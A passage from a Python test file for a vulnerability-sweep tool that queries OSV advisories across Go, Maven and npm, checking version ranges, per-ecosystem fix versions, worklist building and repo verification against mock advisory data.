        "GHSA-nofx-nofx-nofx", "no-fix-lib", {"introduced": "1.0.0"}, {"last_affected": "1.4.0"}
    )
    cmd = _one_row(vuln, [("no-fix-lib", "1.2.0")])
    argv = cmd["impact_argv"]
    assert cmd["fix_available"] is False
    assert cmd["fixed_by_version"] == {"1.2.0": None}
    assert "--fixed-version" not in argv
    assert argv[argv.index("--vulnerable-range") + 1] == "<= 1.4.0"
    assert argv[argv.index("--feature-desc") + 1] == "fleet-osv-sweep"


def test_open_ended_unfixed_advisory_flags_every_version():
    vuln = _spans_vuln("GHSA-open-open-open", "open-lib", {"introduced": "0"})
    cmd = _one_row(vuln, [("open-lib", "3.0.0")])
    argv = cmd["impact_argv"]
    assert cmd["fix_available"] is False
    assert argv[argv.index("--vulnerable-range") + 1] == "*"


_TWO_ECO_VULN = {
    "id": "GHSA-twoe-coss-ystm",
    "aliases": ["CVE-2026-0002"],
    "summary": "one flaw shipped as a Go module and a Maven artifact",
    "database_specific": {"severity": "HIGH"},
    "affected": [
        {
            "package": {"name": "github.com/example/lib", "ecosystem": "Go"},
            "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}],
        },
        {
            "package": {"name": "org.example:lib", "ecosystem": "Maven"},
            "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}],
        },
    ],
}
_TWO_ECO_PAIRS = {
    "Go": {("github.com/example/lib", "1.2.0"): {"repo:go-svc"}},
    "maven": {("org.example:lib", "2.0.0"): {"repo:java-svc"}},
}


def _two_eco_post(chunk, ecosystem):
    return [{"vulns": [{"id": _TWO_ECO_VULN["id"]}]} for _ in chunk]


def test_query_osv_multi_keeps_each_ecosystems_pairs_apart():
    hits = fs.query_osv_multi(_TWO_ECO_PAIRS, jobs=1, post=_two_eco_post)
    h = hits[_TWO_ECO_VULN["id"]]
    assert h["by_ecosystem"] == {
        "Go": {("github.com/example/lib", "1.2.0")},
        "maven": {("org.example:lib", "2.0.0")},
    }
    # the legacy fields are still there for older readers
    assert h["ecosystem"] == "Go"
    assert h["pairs"] == {("github.com/example/lib", "1.2.0"), ("org.example:lib", "2.0.0")}


def test_two_ecosystem_advisory_tags_each_command_with_its_own_ecosystem():
    hits = fs.query_osv_multi(_TWO_ECO_PAIRS, jobs=1, post=_two_eco_post)
    rows, rejected = fs.build_worklist(
        fs.dedupe_by_cve({_TWO_ECO_VULN["id"]: _TWO_ECO_VULN}),
        hits,
        _TWO_ECO_PAIRS,
        min_rank=fs.SEV_RANK["HIGH"],
        deep_cap=100,
    )
    # previously the Maven coordinate was gated under Go's name rules
    assert rejected == []
    (row,) = rows
    assert row["ecosystems"] == ["Go", "maven"]
    # both ecosystems' repos count toward the blast radius
    assert row["in_range_repos"] == 2
    by_module = {c["module"]: c for c in row["commands"]}
    go, mvn = by_module["github.com/example/lib"], by_module["org.example:lib"]
    assert go["ecosystem"] == "Go" and mvn["ecosystem"] == "maven"
    assert go["impact_argv"][go["impact_argv"].index("--ecosystem") + 1] == "Go"
    assert mvn["impact_argv"][mvn["impact_argv"].index("--ecosystem") + 1] == "maven"
    # each module's fix comes from its own ecosystem's affected entry
    assert go["fixed_by_version"] == {"1.2.0": "1.4.0"}
    assert mvn["fixed_by_version"] == {"2.0.0": "2.1.0"}


def test_verify_worklist_checks_each_module_under_its_own_ecosystem():
    mal = {
        "id": "MAL-2026-0002",
        "summary": "malicious in two ecosystems",
        "affected": [
            {"package": {"name": "evil-go", "ecosystem": "Go"}},
            {"package": {"name": "evil-js", "ecosystem": "npm"}},
        ],
    }
    pairs = {
        "Go": {("evil-go", "1.0.0"): {"repo:a"}},
        "npm": {("evil-js", "2.0.0"): {"repo:b"}},
    }
    prov = {
        "Go": {("evil-go", "1.0.0"): {"repo:a": ["go.mod"]}},
        "npm": {("evil-js", "2.0.0"): {"repo:b": ["package.json"]}},
    }
    hits = fs.query_osv_multi(
        pairs, jobs=1, post=lambda c, e: [{"vulns": [{"id": mal["id"]}]}] * len(c)
    )
    rows, _ = fs.build_worklist(
        fs.dedupe_by_cve({mal["id"]: mal}),
        hits,
        pairs,
        min_rank=fs.SEV_RANK["CRITICAL"],
        deep_cap=100,
        prov_by_eco=prov,
    )
    calls = []

    def fake_verify(repo, eco, module, version, paths):
        calls.append((repo, eco, module, version))
        return {"status": "confirmed", "evidence": "declared", "manifest": paths[0]}

    fs.verify_worklist(rows, hits, verify=fake_verify)
    assert sorted(calls) == [
        ("repo:a", "Go", "evil-go", "1.0.0"),
        ("repo:b", "npm", "evil-js", "2.0.0"),
    ]
